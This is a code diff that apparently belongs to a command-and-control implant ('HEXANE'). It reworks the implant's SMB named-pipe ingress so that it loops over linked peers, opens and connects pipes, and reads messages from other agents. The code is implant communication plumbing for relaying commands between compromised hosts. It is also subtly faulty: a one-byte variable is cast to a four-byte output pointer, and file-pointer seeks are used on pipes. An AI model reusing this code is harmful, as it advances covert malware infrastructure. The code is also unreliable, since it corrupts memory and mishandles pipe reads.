@@ -355,7 +355,44 @@ namespace Smb {
         return true;
     }
 
-    // if a parent is assigned more than one child, pipes can be branched?
+    BOOL PeekClientMessage(HANDLE handle, _stream &stream, uint32_t &offset) {
+        HEXANE
+
+        _stream header = { };
+        uint32_t current = 0;
+        uint32_t read = 0;
+
+        // locate the offset to a client message
+        while (true) {
+            if (!Ctx->win32.PeekNamedPipe(handle, &header, sizeof(_stream), R_CAST(LPDWORD, &read), NULL, NULL) || read == 0) {
+                return false;
+            }
+
+            if (header.peer_id == Ctx->session.peer_id) {
+                uint32_t total = sizeof(_stream) + header.length;
+                current += total;
+
+                SetFilePointer(handle, total, NULL, FILE_CURRENT);
+            } else {
+                stream = header;
+                offset = current;
+                return true;
+            }
+        }
+    }
+
+    BOOL ProcessClientMessage(HANDLE handle, _stream& stream) {
+        HEXANE
+
+        uint8_t read = 0;
+        stream.buffer = R_CAST(uint8_t*, x_malloc(stream.length));
+
+        if (!Ctx->win32.ReadFile(handle, stream.buffer, stream.length, R_CAST(LPDWORD, &read), NULL)) {
+            return false;
+        } else {
+            return true;
+        }
+    }
 
     VOID PeerConnectIngress (_stream *out, _stream **in) {
         HEXANE
@@ -364,54 +401,42 @@ namespace Smb {
 
         SECURITY_ATTRIBUTES sec_attr    = { };
         SMB_PIPE_SEC_ATTR smb_attr      = { };
-        HANDLE handle                   = { };
 
-        ULONG msg_length    = 0;
-        ULONG peer_id       = 0;
-        ULONG n_bytes       = 0;
+        auto head = Ctx->peers;
+        while (head) {
 
-        // save the handle
-        if (!Ctx->config.IngressHandle) {
-            SmbContextInit(&smb_attr, &sec_attr);
+            _stream stream = { };
+            uint32_t offset = 0;
 
-            if (!(handle = Ctx->win32.CreateNamedPipeW(Ctx->config.IngressPipename, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr))) {
-                return_defer(ntstatus);
+            if (head->ingress_name) {
+                if (!head->ingress_handle) {
+
+                    SmbContextInit(&smb_attr, &sec_attr);
+                    if (!(head->ingress_handle = Ctx->win32.CreateNamedPipeW(head->ingress_name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr))) {
+                        return_defer(ntstatus);
+                    }
+
+                    SmbContextDestroy(&smb_attr);
+                    if (!Ctx->win32.ConnectNamedPipe(head->ingress_handle, nullptr)) {
+                        return_defer(ntstatus);
+                    }
+                }
             }
 
-            SmbContextDestroy(&smb_attr);
+            if (head->ingress_handle) {
+                while (PeekClientMessage(head->ingress_handle, stream, offset)) {
+                    SetFilePointer(head->ingress_handle, offset, NULL, FILE_BEGIN);
 
-            if (!Ctx->win32.ConnectNamedPipe(handle, nullptr)) {
-                return_defer(ntstatus);
-            }
-        }
-
-        if (!Ctx->win32.PeekNamedPipe(handle, nullptr, 0, nullptr, &n_bytes, nullptr)) {
-            return_defer(ntstatus);
-        }
-
-        if (n_bytes > sizeof(uint32_t) * 2) {
-            msg_length = n_bytes;
-
-            if (
-                !Ctx->win32.ReadFile(handle, &peer_id, sizeof(uint32_t), &n_bytes, nullptr) ||
-                (Ctx->session.peer_id != peer_id)) {
-                return_defer(ntstatus);
+                    if (!ProcessClientMessage(head->ingress_handle, stream)) {
+                        return_defer(ntstatus);
+                    }
+                }
             }
 
-            (*in) = S_CAST(_stream*, x_malloc(sizeof(_stream)));
-            (*in)->buffer = x_malloc(msg_length);
-            (*in)->length = msg_length;
+            Ctx->win32.SleepEx(500, FALSE);
+            SetFilePointer(head->ingress_handle, 0, NULL, FILE_BEGIN);
 
-            PipeRead(handle, *in);
-
-        } else {
-            return_defer(ERROR_INSUFFICIENT_BUFFER);
-        }
-
-        if (out) {
-            if (!PipeWrite(handle, out)) {
-                return_defer(ERROR_WRITE_FAULT);
-            }
+            head = head->next;
         }
 
         defer:
